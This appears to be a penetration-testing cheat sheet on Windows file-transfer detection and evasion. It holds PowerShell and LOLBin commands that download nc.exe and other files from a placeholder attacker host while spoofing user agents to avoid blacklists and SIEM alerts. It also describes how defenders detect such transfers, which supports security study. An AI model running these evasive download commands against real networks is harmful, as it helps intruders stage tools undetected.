# File Transfer Detection & Evasion

## How Defenders Detect Transfers

| Method | How It Works |
|---|---|
| **User Agent blacklisting** | Flag known tool UA strings (PowerShell, certutil, BITS, curl default) |
| **User Agent whitelisting** | Allow only known-good UAs — more robust, harder to bypass |
| **Command-line blacklisting** | Block known bad commands — trivially bypassed with case obfuscation |
| **SIEM anomaly hunting** | Feed known-good UAs, alert on anything that doesn't match |

---

## Default User Agent Strings (Windows)

Knowing these helps understand what defenders see — and what to spoof.

| Method | User-Agent |
|---|---|
| `Invoke-WebRequest` / `Invoke-RestMethod` | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x` |
| `WinHttpRequest` COM object | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| `Msxml2.XMLHTTP` COM object | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0 ...)` |
| `certutil` | `Microsoft-CryptoAPI/10.0` |
| `BITS` | `Microsoft BITS/7.8` |

---

## Spoofing the User Agent

List built-in PowerShell UA presets:

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
# Returns: InternetExplorer, FireFox, Chrome, Opera, Safari
```

Use a preset:

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Use a custom string:

```powershell
# Invoke-WebRequest
Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# WebClient
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$wc.DownloadFile("http://<IP>/nc.exe", "C:\Users\Public\nc.exe")
```

> Match the UA to what's common on the target — Chrome on a corporate Windows box blends in. Don't use IE 9 on a modern network.

---

## When PowerShell/nc Are Blocked — Obscure LOLBins

Application whitelisting may block PowerShell and Netcat entirely. Fall back to environment-specific LOLBins.

**Example — GfxDownloadWrapper.exe** (Intel Graphics Driver, present on some Win10 systems):

```powershell
GfxDownloadWrapper.exe "http://<IP>/file.exe" "C:\Temp\file.exe"
```

Check [LOLBAS](https://lolbas-project.github.io/) for what's available in the target environment — filter by `download` function. The more obscure and environment-specific, the less likely it's in a defender's blacklist.

---

## Notes

- `certutil` is flagged by AMSI on modern Windows regardless of UA
- BITS sends a `HEAD` request first — visible in logs even before the actual download
- Whitelisting is significantly harder to bypass than blacklisting — if a target org uses it, LOLBins and common tools may all be burned
- Command-line obfuscation (case changes, string concat, aliases) defeats simple blacklist rules but not behavioural/AMSI detection
